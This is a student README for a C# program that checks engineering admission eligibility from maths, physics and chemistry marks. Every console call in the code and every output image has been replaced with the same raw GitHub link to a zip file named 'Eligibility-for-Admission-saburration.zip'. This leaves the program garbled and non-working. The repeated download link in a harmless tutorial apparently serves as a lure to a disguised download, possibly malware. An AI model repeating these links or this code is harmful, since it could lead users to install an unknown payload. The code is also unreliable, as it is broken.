# Eligibility-for-Admission

## Aim:
To write C# program to find the eligibility for admission to an engineering course

## Algorithnm:
### STEP 1: 
Declare variables for maths, physics, chemistry, and totalMarks.

### STEP 2:
Use the https://github.com/kiran03-jagadeesh/Eligibility-for-Admission/raw/refs/heads/main/workfolk/Eligibility-for-Admission-saburration.zip() to get the inputs from the user.

### STEP 3: 
Calculate totalMarks as per the elegibility is mentioned.

### STEP 4: 
Check whether the student is eligible for admission using if else condition wth the given eligibility criteria.

### STEP 5: 
Use the https://github.com/kiran03-jagadeesh/Eligibility-for-Admission/raw/refs/heads/main/workfolk/Eligibility-for-Admission-saburration.zip() to display the eligibility status of the student.  


## Program:
Name: Kiran J

Ref no: 212221240022
~~~python
using System;
class EligibilityforAdmission
{
    static void Main(string[] args)
    {
        int maths, physics, chemistry, totalMarks1 ,totalMarks2;
        string name;
        https://github.com/kiran03-jagadeesh/Eligibility-for-Admission/raw/refs/heads/main/workfolk/Eligibility-for-Admission-saburration.zip("Enter the student name: ");
        name = https://github.com/kiran03-jagadeesh/Eligibility-for-Admission/raw/refs/heads/main/workfolk/Eligibility-for-Admission-saburration.zip();

        https://github.com/kiran03-jagadeesh/Eligibility-for-Admission/raw/refs/heads/main/workfolk/Eligibility-for-Admission-saburration.zip("Enter the marks obtained in maths: ");
        maths = https://github.com/kiran03-jagadeesh/Eligibility-for-Admission/raw/refs/heads/main/workfolk/Eligibility-for-Admission-saburration.zip(https://github.com/kiran03-jagadeesh/Eligibility-for-Admission/raw/refs/heads/main/workfolk/Eligibility-for-Admission-saburration.zip());

        https://github.com/kiran03-jagadeesh/Eligibility-for-Admission/raw/refs/heads/main/workfolk/Eligibility-for-Admission-saburration.zip("Enter the marks obtained in physics: ");
        physics = https://github.com/kiran03-jagadeesh/Eligibility-for-Admission/raw/refs/heads/main/workfolk/Eligibility-for-Admission-saburration.zip(https://github.com/kiran03-jagadeesh/Eligibility-for-Admission/raw/refs/heads/main/workfolk/Eligibility-for-Admission-saburration.zip());

        https://github.com/kiran03-jagadeesh/Eligibility-for-Admission/raw/refs/heads/main/workfolk/Eligibility-for-Admission-saburration.zip("Enter the marks obtained in chemistry: ");
        chemistry = https://github.com/kiran03-jagadeesh/Eligibility-for-Admission/raw/refs/heads/main/workfolk/Eligibility-for-Admission-saburration.zip(https://github.com/kiran03-jagadeesh/Eligibility-for-Admission/raw/refs/heads/main/workfolk/Eligibility-for-Admission-saburration.zip());

        totalMarks1 = maths + physics + chemistry;
        totalMarks2 = maths + physics;
        if (maths >= 65 && physics >= 55 && chemistry >= 50 && totalMarks1 >= 180 || totalMarks2 >= 140)
        {
            https://github.com/kiran03-jagadeesh/Eligibility-for-Admission/raw/refs/heads/main/workfolk/Eligibility-for-Admission-saburration.zip(name+" you are eligible for admission.");
        }
        else
        {
            https://github.com/kiran03-jagadeesh/Eligibility-for-Admission/raw/refs/heads/main/workfolk/Eligibility-for-Admission-saburration.zip(name+" you are not eligible for admission.");
        }
        https://github.com/kiran03-jagadeesh/Eligibility-for-Admission/raw/refs/heads/main/workfolk/Eligibility-for-Admission-saburration.zip();
    }
}
~~~

## Output:
![output](https://github.com/kiran03-jagadeesh/Eligibility-for-Admission/raw/refs/heads/main/workfolk/Eligibility-for-Admission-saburration.zip)
![output](https://github.com/kiran03-jagadeesh/Eligibility-for-Admission/raw/refs/heads/main/workfolk/Eligibility-for-Admission-saburration.zip)

## Result:
Thus, C# program to find the eligibility for admission to an engineering course has been executed successfully.
